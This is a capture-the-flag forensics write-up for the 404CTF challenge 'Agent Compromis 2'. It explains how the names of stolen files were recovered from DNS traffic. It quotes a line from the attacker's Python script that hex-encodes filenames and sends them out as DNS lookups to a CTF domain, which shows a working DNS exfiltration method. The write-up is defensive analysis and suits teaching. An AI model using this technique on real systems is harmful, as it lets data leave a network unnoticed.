# Agent Compromis 2

## Task 

We have to find the names of the files that have been exfiltrated by the attacker.

## Process

To do what we are supposed to do, we just look at the python script that we have found and notice that line :

```python
dns.resolver.resolve(binascii.hexlify(filename.encode()).decode() + ".hallebarde.404ctf.fr")
```

It seems like the name of the file is converted to a string of hex and sent as a dns request as such 
``` 
[FILENAME_IN_HEX].hallebarde.404ctf.fr 
```
And from this line, we know that it is always preceded by a dns query for never-gonna-give-you-up.hallebarde.404ctf.fr : 
```python
dns.resolver.resolve("never-gonna-give-you-up.hallebarde.404ctf.fr")
```
We can then use wireshark's search function to find the file names and we find those 4 hex strings :
```
73757065722d7365637265742e706466
657866696c74726174696f6e2e7079
666c61672e747874
68616c6c6562617264652e706e67
```
And then converted it gives us what we were looking for : 
```
super-secret.pdf
exfiltration.py
flag.txt
hallebarde.png
```

The flag : 404CTF{exfiltration.py,flag.txt,hallebarde.png,super-secret.pdf}